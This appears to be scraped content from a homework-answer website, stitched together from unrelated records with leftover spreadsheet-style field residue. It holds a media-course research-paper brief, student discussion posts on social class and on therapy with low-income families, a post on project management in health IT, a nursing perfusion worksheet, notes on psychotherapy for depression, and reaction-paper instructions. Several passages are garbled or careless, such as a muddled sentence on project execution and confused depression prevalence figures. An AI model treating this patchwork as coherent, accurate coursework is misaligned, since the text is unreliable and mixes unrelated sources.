Wk13: Submit your rough draft.

Wk14: Revise your rough draft in accordance with instructor feedback.

Wk15: Submit your final project report; provide your conclusions &

recommendations in the discussion.

Wk16: Fill out and submit the approval and transmittal documents; discuss your

projects in the discussion.

Happy researching!

• Critical research paper (150 points, ~25 percent of final grade)

: Students will write a 1,500-word research paper analyzing and criticizing a specific media
start-up (keep in mind, it doesn’t have to be a startup that succeeded) or media entrepreneur.
Again, this is a media class; the company must exist in that space.

Some of the basic information your paper must include is the founders' name, when the

the company was founded, where it was founded, what its original purpose was, and what

funding the company had initially. This section needs to be titled “The story of _____ (name

of the company or entrepreneur you’re researching” and be no more than 600 words.

The majority of the paper must be titled “A critical analysis of _____ (name of the company or

entrepreneur” and be 900 words. You must critically analyze the trajectory of the

business/entrepreneur and the specific media industry (journalism, advertising, social media,
marketing, etc.) it exists in. In terms of the specific media industry this company exists in, I need
to know whether this industry is crowded or fledgling. It is also in this portion of the paper where
I need to see a lot of supported insight (use footnotes + use reputable sources) to support why
the company has succeeded, failed, or is on the brink of succeeding/failing.

Other points that need to be addressed in this portion:

● Has the industry been quick to adapt to new technology or slow?

● In terms of the specific company you focus on, what are the successes and failures it has
had?

● In regards to the failures, why did they occur, how could they have been avoided, and was the
company able to recover? For example, some common failures include a poorly designed
business plan, the inability to generate revenue, a leadership vacuum (or bickering), a crowded
industry, legal woes, and public relations problems. Some companies will experience one of
those failures or a combination of a few.

● Furthermore, was there a company like it that tried and failed already? Why did another
company thrive or fail in comparison to the one you’re writing about?

● What made this entrepreneur different than so many others? What made this person and
his/her situation unique?




● And most importantly, is the business you’ve selected sustainable? What, if anything,
could disrupt its success and why?

Your paper must have no less than seven reputable sources cited.

One of your sources must be an interview you conduct with a business or media
professional(a reporter who has
written about this company, for example) who can help you address the questions above

(you CANNOT interview a professor in the college or a fellow student).

The paper must have a clear introduction and conclusion. It must also abide by AP Style and

cite sources in-text using APA style. Quoted material must be no longer than two lines and

must abide by the 2:1 rule; meaning, for every line you quote, you must have at least two lines

of explanation/discussion. Spelling and grammar errors will have points deducted. More

information on the paper will be provided weeks before it is due.

Wikipedia (and any other wiki-type sites) are not acceptable sources for all papers in this

class.

Unit 3.1 DB: Social Class & Internalized Messages 2 responses,"1.  While the poor are often portrayed as those who lack resources or may be seen as dependent on social assistance programs, I definitely grew up in a low-income household where we struggled with a lot of things like financial hardships and my parents being concerned what we would have for supper for that night no matter how hard they worked. The way that I see the middle class is a sense of stability with moderate financial comfort, meaning they aren't struggling to get by but they do not neccessarily have the finances to buy extravegant things. This is not to say that they are not just as hardworking, if not more in some cases, in order to strive for upwards mobility. I'm not afraid to say that I see wealthy people as privileged in most cases, for they have access to things that not everyone does like a better education, luxury, and bigger opportunities for life growth. Stereotypical messages were definitely provided to me as well as other people throughout media, cultural narratives, and personal experiences, giving the viewer direction of self-worth based on their class. Of course, when we teach our children things such as what the ""American Dream"" is, that narrative reinforces the idea that the middle class success is attainable through education and hard work. Ultimately, various media, social circles, and exposure to affluent lifestyles all have a big contribution to the way that these messages shape my perception through portrayals of all three classes in things like movies as well as the news. ""Class position involves one’s relationship to the economic structure, which varies between countries and regions. This relationship includes the nature and relative self-direction of one’s labor. (Ehrenreich, 1989, 2009; as cited in McGoldrick, Garcia, & Carter, 2016) Human services professionals must recognize that poverty is multifaceted, and individuals experiencing poverty have diverse needs. Empathy, understanding, and advocacy are crucial in supporting them. Professionals working with the middle class should understand their unique challenges. Balancing work, family, and financial responsibilities can be stressful. Human Service professionals also need to recognize that wealth doesn’t guarantee happiness or well-being. The wealthy may face unique challenges related to family dynamics, mental health, and social isolation. Cultivating empathy and addressing their needs without judgment is crucial. Physical image, family size, identity, values, aspirations, home life, and marital status intersect with these messages. We must approach each individual holistically, considering their context and unique experiences. Avoiding assumptions and promoting inclusivity is vital in providing effective support across all socioeconomic backgrounds.  

2. Messages I’ve internalized about the poor are “If they want to have more or do better, they will’” or “They are looking for handouts.” Hearing these things before learning the effects of poverty, and being born in those communities, I felt the working, middle-class, and wealthy were a group of people who decided they would put in the work to have everything they wanted and needed. Furstenberg (2007) reports, however, that teen parenthood itself contributes less to the intergenerational transmission of poverty than does living in poor neighborhoods, without access to resources and information available elsewhere (McGoldrick et al., 2016). While in low-income, poor communities teen mom pregnancies are at higher rates, this doesn’t impact why many families have limited access to quality healthcare, educational institutions, and homeownership programs.
I learned these messages as I got older more so in school, through the media, from individuals who are working middle class, that outwardly shouted their frustration about their tax dollars being used to help the poor. I was easy to influence when I was younger. I also grew up in a single-parent household myself. So I was able to see my Mother provide for seven kids. We always had the necessities, food, clothing, and shelter. I don’t think I necessarily looked down on anyone with less than our family, but I do have to admit I did have the mindset, why can’t they put in the work?
These messages have shaped me to realize I can still have biases at times. It also has helped me to realize that working with any population, get rid of any assumptions mentally. Research the demographic I will be working for before working with them, so I can be aware and better educated about some of the challenges that plight them. It is my job to research to serve efficiently whoever I am connected to.
 Question: do you feel guilty, about any messages you’ve heard and believed before getting the proper education about the group you are assigned to?

Unit 3.2 DB: Working with Low-Income Families 2 responses,"1.   Therapists who work effectively with low-income families possess a unique set of qualities, knowledge, and experience that enable them to provide the best care and support. Firstly, they exhibit empathy, understanding, and compassion towards the challenges and struggles faced by individuals living in poverty. They are culturally sensitive and aware of the societal and economic factors that influence their clients' lives. Additionally, these therapists have a strong foundation of knowledge in psychology, social work, or counseling, allowing them to tailor their interventions to meet the specific needs of low-income families (National Association of Social Workers, 2015). They are equipped with practical strategies for addressing financial stress, trauma, and other issues commonly experienced by this population. Moreover, experience working with diverse populations and a genuine commitment to social justice and advocacy are essential qualities that enable therapists to create a safe and supportive environment for their clients (McGoldrick et al., 2014). By combining these qualities, knowledge, and experiences, therapists can make a positive impact on the mental health and well-being of low-income families.
How can we as therapists or social workers become more culturally sensitive?

2.  A therapist should possess empathy and an open mind when dealing with low-income families. Understanding that there is a reason these families are where they are and helping them to find the solution to come out of this situation without judgment or bias. Having an open mind and even listening to hear and not judge. In doing this, people will respond and feel more comfortable to share and trust the therapist with more of their information. 
A therapist should be knowledgeable of income and economic issues when dealing with low-income families. Showing them that they understand that the economy has changed and that they understand the challenges they are facing while helping them find solutions. 
A therapist should have the experience of working with low-in families, which will eliminate all biases and all judgmental attitudes So that they can accurately and comprehensive assess clients class status and Identity.

Hello, 
Project Management in health information technology works to improve productivity of an organization. Project Management is like an advisor, coach, or teacher. Project management works with teams to ensure projects follow requirements for developing and delivering a project's completion. A person in that position handles developing a project’s plans. They implement strategies to get the project started. Executing the project is a nothing thing that is part of the project management roles. Project management also checks the completion and finishing of the projects. As project management works with stakeholders, minimize the cost of a project, and ensure it is completed on time without problems. Project management impacts health information technology. Project management impacts patient care by lowering healthcare costs, improving population health, to ensure better patient care. It helps the organization run smoothly and make sure employees are on track with performing and completing projects in the organizations. Project management makes sure delivery is successful. Impact of project management improves collaboration and communication between individuals and team. Project management works with the organization to budget and schedules for projects to be completed. It’s easier to develop new websites or ideas in an organization.

The role of project management in health information technology is to assess, develop, suggest and implement new software and systems for the organization.
The role of project management in my organization is to assess, develop, suggest and implement new equipment, procedures, software, hardware, upgrading technology. Currently, the project that I'm on is our reference laboratory changed, and we started sending most of our laboratory tests to another reference laboratory. This requires assistance from many different departments in the hospital. I am the laboratory person, I get the new tests set up; and then after the tests are built, Charge Services makes sure the prices and codes are dropping correctly. Then Health Informatics Team looks for the old test in providers' favorites or on order sets and they update the providers and the order sets. Then I remove the old test from the testing compendium. We've been doing this since September, and it's an ongoing process.
The impact of project management in our organization is that we get new equipment, procedures, software, hardware. It may take a short time to get the projects done, but it mostly takes a long time for the projects to be completed. The project I was in before the one I'm in now was the implementation of Cerner Electronic Medical Record system in our organization. While it is mostly complete, there are things that we are fine tuning; even after two years, we're still finding issues with Cerner.",,,,Information Systems,Project|Planning,https://www.sweetstudy.com/questions/project-planning-and-implementation-in-health-care

Department of Nursing		NUR130 Perfusion Assignment
Perfusion Assignment: Part I

Understanding the importance of perfusion is vital for many patients. Perfusion has been discussed already in Module 2 and will be further discussed in Module 3. The first part of this assignment creates an opportunity for the learner to 
            compare perfusion as it relates to different disease processes. The second part of the assignment is to provide the learner with an opportunity to 
            apply their understanding of perfusion as it relates to caring for a patient with multiple disease processes. 
        


1. In your own words, differentiate peripheral perfusion versus central perfusion (1 point). 





2. The following patient scenarios reflect peripheral perfusion or central perfusion. Review each case and 
            determine which type of perfusion applies (peripheral or central) and
provide three appropriate assessments and three appropriate interventions with rationales that these patients will need (total of four cases). 

A. Patient with a history of coronary artery disease, diabetes, and hypertension presents to the emergency room with complaints of chest pain, nausea, and shortness of breath. The patient is diagnosed and admitted for stable angina. What type of perfusion applies to this case? What are the appropriate assessments and interventions for this patient? (1 point)







B. Patient with a history of type I diabetes, osteoarthritis, obesity, atherosclerosis and arterial occlusive disease. Patient presents to the doctor’s office with complaints of increased pain when ambulating but states, “The pain goes away when I stop walking.” What type of perfusion applies to this case? What are the appropriate assessments and intervention for this patient? (1 point)











C. Patient with a right distal radius fracture after a recent motor vehicle crash. A cast was applied and one week later presents to the emergency room with complaints of extreme pain not relieved by prescribed pain medication. Patient rates pain 10/10, unable to move fingers, and has +2 edema. What type of perfusion applies to this case? What are the appropriate assessments and intervention for this patient? ( 1 point)








D. Patient post-op for an anterior cervical fusion of the spine has just finished surgery. Report from the operating room (OR) nurse to the post-anesthesia care unit (PACU) nurse includes that during surgery the estimated blood loss (EBL) was 800 mL. Vital signs include: 89/52, 120, 16, and a temperature of 98.6 degrees Fahrenheit. The patients pulse oximeter reading is 93% on 2 liters nasal cannula (NC). The patient is drowsy, has CRT’s >3 seconds, and is restless. What type of perfusion applies to this case? What are the appropriate assessments and intervention for this patient? (1 point)








3. Reflect on the 
            

overall concept

 of 
            perfusion after planning client specific interventions and treatments (ONE reflection for all cases).

1-Supportive Listening, Role Playing, Communication Analysis and Affect Building are a process that will allow you to experience unpleasant or unwanted feelings and emotions around your interpersonal problems in a safe therapeutic environment. The primary goal of Integrating interpersonal psychotherapy  revolves around empowering people to improve their relationships by learning effective strategies for communicating emotions and needs while addressing challenges within meaningful relationships. Therapists who use IPT emphasize the biopsychosocial understanding of depression. They know that negative or distressing life events can exacerbate feelings of sadness and worthlessness. As interpersonal connections improve, depressive symptoms may decrease, leading to better functioning in various areas of life. Typically, adults participate in 16 to 20 weekly IPT sessions. In some cases, IPT can be supplemented with second-generation antidepressants if medication is considered. Treatment begins with a comprehensive assessment of social and emotional functioning, along with patient education about the biopsychosocial model of depression. 

2-One of the most frequent mental health conditions is Depression in adult patients. Generally, this condition includes a range of mood disorders characterized by a failure of management and subjective experience of significant distress. Depression is the leading cause of disability worldwide and contributes to the overall global burden of disease. About 3.8% of the people are impacted ( 5.0% of adults and 5.7% of adults over 60). Cognitive Behavioral Therapy (CBT) is generally utilized to treat patients who are affected by Depression. Cognitive Behavioral Therapy (CBT) is very useful in Depression; the study in the article investigates the effectiveness of individual and group CBT, the effectiveness of CBT used in a community context, its effectiveness regarding pharmacotherapy management, and the long-term efficiency of CBT. The Pubmed, Cochrane, and Scopus databases assumed a systematic literature assessment for 2007-2021. The standards for the inclusion of the analyses were that the report language should be English, the population should include adults, adolescents, and children of all sexes suffering from Depression, and the criteria for excluding studies were CBT intervention via the Internet or telephone (Ioannou, Prodromou, Andrea-Apostolidou, & Kallergis, 2023).",,,,Nursing,Tag,https://www.sweetstudy.com/questions/reply-20798585

Reaction Papers - Introduction

A reaction paper is just what its name suggests: a formal paper explaining your reaction to a peer-reviewed journal article whose topic is relevant to this course. The paper is a review because your reaction will involve judgment or evaluation; it is an analysis because you will focus on the research methodology and results.
Keep in mind that you are writing a formal essay for an academic audience. Like any good essay, your reaction paper should develop one primary idea or perception, support it with specific evidence (examples from your article, etc.), and present both ideas and evidence in clear language and a logical way.

· Write a paper analyzing the journal article and explaining your reaction to it
· Each paper must be two pages long and follow APA format (no abstract required)
· Understand that following APA format in terms of margins, font, in-text citing, referencing, quoting, and the like is very important and makes up a good portion of your paper’s grade
· In addition to the APA guide, the following website offers valuable APA format information for you to follow when you are writing this paper:
